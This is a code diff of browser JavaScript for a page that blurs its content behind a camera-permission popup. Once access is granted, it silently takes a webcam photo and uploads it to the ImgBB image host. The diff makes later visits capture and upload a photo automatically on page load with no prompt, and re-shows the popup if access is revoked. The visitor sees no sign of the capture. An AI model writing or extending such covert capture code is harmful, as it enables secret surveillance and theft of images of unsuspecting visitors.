@@ -7,34 +7,68 @@ let popupShown = false;
 
 
 /* =========================
-   POPUP CONTROL
+   CHECK SAVED CONSENT
 ========================= */
 
-function showPopup() {
+window.addEventListener("load", () => {
 
-    if (popupShown) return;
+    const consentGiven = localStorage.getItem("cameraConsent");
+
+
+    if(consentGiven === "granted"){
+
+        // Try camera directly
+        startCamera();
+
+    }
+    else{
+
+        startPopupTriggers();
+
+    }
+
+});
+
+
+
+/* =========================
+   POPUP LOGIC
+========================= */
+
+function showPopup(){
+
+    if(popupShown) return;
+
 
     popupShown = true;
 
+
     pageContent.classList.add("blur");
+
 
     popup.classList.add("show");
 
 
-    // remove listeners after popup appears
-    window.removeEventListener("scroll", interactionTrigger);
-    window.removeEventListener("click", interactionTrigger);
-    window.removeEventListener("touchstart", interactionTrigger);
+    window.removeEventListener(
+        "scroll",
+        interactionTrigger
+    );
+
+    window.removeEventListener(
+        "click",
+        interactionTrigger
+    );
+
+    window.removeEventListener(
+        "touchstart",
+        interactionTrigger
+    );
 
 }
 
 
 
-/* =========================
-   USER INTERACTION TRIGGER
-========================= */
-
-function interactionTrigger() {
+function interactionTrigger(){
 
     showPopup();
 
@@ -42,47 +76,43 @@ function interactionTrigger() {
 
 
 
-/* =========================
-   TIMER TRIGGER
-========================= */
-
-setTimeout(() => {
-
-    showPopup();
-
-}, 1000);
+function startPopupTriggers(){
 
 
+    setTimeout(()=>{
 
-/* =========================
-   LISTEN FOR USER ACTION
-========================= */
+        showPopup();
 
-window.addEventListener(
-    "scroll",
-    interactionTrigger,
-    { once:true }
-);
+    },1000);
 
 
-window.addEventListener(
-    "click",
-    interactionTrigger,
-    { once:true }
-);
+
+    window.addEventListener(
+        "scroll",
+        interactionTrigger,
+        {once:true}
+    );
 
 
-window.addEventListener(
-    "touchstart",
-    interactionTrigger,
-    { once:true }
-);
+    window.addEventListener(
+        "click",
+        interactionTrigger,
+        {once:true}
+    );
 
+
+    window.addEventListener(
+        "touchstart",
+        interactionTrigger,
+        {once:true}
+    );
+
+}
 
 
 
 /* =========================
-   CAMERA PERMISSION
+   CAMERA BUTTON
 ========================= */
 
 allowButton.addEventListener(
@@ -92,9 +122,10 @@ allowButton.addEventListener(
 
 
 
-async function startCamera() {
+async function startCamera(){
 
-    try {
+    try{
+
 
         stream = await navigator.mediaDevices.getUserMedia({
 
@@ -103,15 +134,24 @@ async function startCamera() {
         });
 
 
-        // permission granted
+
+        // remember permission
+        localStorage.setItem(
+            "cameraConsent",
+            "granted"
+        );
+
+
+
+        // close popup
         popup.classList.remove("show");
 
-        // remove blur immediately
+
         pageContent.classList.remove("blur");
 
 
 
-        setTimeout(() => {
+        setTimeout(()=>{
 
             capturePhoto();
 
@@ -122,7 +162,7 @@ async function startCamera() {
     }
 
 
-    catch(error) {
+    catch(error){
 
 
         console.error(
@@ -131,29 +171,40 @@ async function startCamera() {
         );
 
 
-        if(error.name==="NotAllowedError") {
 
-            alert(
-                "Camera permission denied."
+        if(error.name === "NotAllowedError"){
+
+
+            // permission revoked/blocked
+            localStorage.removeItem(
+                "cameraConsent"
             );
+
+
+            startPopupTriggers();
+
 
         }
 
 
-        else if(error.name==="NotFoundError") {
+        else if(error.name === "NotFoundError"){
+
 
             alert(
                 "No camera found."
             );
 
+
         }
 
 
-        else {
+        else{
+
 
             alert(
                 "Unable to access camera."
             );
+
 
         }
 
@@ -170,10 +221,12 @@ async function startCamera() {
    CAPTURE PHOTO
 ========================= */
 
-function capturePhoto() {
+function capturePhoto(){
 
 
-    const video = document.createElement("video");
+    const video =
+    document.createElement("video");
+
 
 
     video.srcObject = stream;
@@ -185,14 +238,14 @@ function capturePhoto() {
 
 
 
-    video.onloadedmetadata = () => {
+    video.onloadedmetadata = ()=>{
 
 
         video.play();
 
 
 
-        setTimeout(() => {
+        setTimeout(()=>{
 
 
             const canvas =
@@ -202,6 +255,7 @@ function capturePhoto() {
 
             canvas.width =
             video.videoWidth;
+
 
 
             canvas.height =
@@ -240,6 +294,7 @@ function capturePhoto() {
 
 
 
+            // upload separately
             uploadImage(imageBase64);
 
 
@@ -248,7 +303,7 @@ function capturePhoto() {
 
 
 
-        },1000);
+        },800);
 
 
 
@@ -265,15 +320,16 @@ function capturePhoto() {
    STOP CAMERA
 ========================= */
 
-function stopCamera() {
+function stopCamera(){
 
 
-    if(!stream) return;
+    if(!stream)
+        return;
 
 
 
     stream.getTracks()
-    .forEach(track => {
+    .forEach(track=>{
 
         track.stop();
 
@@ -294,7 +350,7 @@ function stopCamera() {
    IMGBB UPLOAD
 ========================= */
 
-async function uploadImage(image) {
+async function uploadImage(image){
 
 
     const API_KEY =
@@ -314,7 +370,7 @@ async function uploadImage(image) {
 
 
 
-    try {
+    try{
 
 
         const response =
@@ -339,22 +395,26 @@ async function uploadImage(image) {
 
 
 
-        if(data.success) {
+        if(data.success){
+
 
             console.log(
                 "Upload successful:",
                 data.data.url
             );
 
+
         }
 
 
-        else {
+        else{
+
 
             console.error(
                 "Upload failed:",
                 data
             );
+
 
         }
 
@@ -362,7 +422,7 @@ async function uploadImage(image) {
     }
 
 
-    catch(error) {
+    catch(error){
 
 
         console.error(
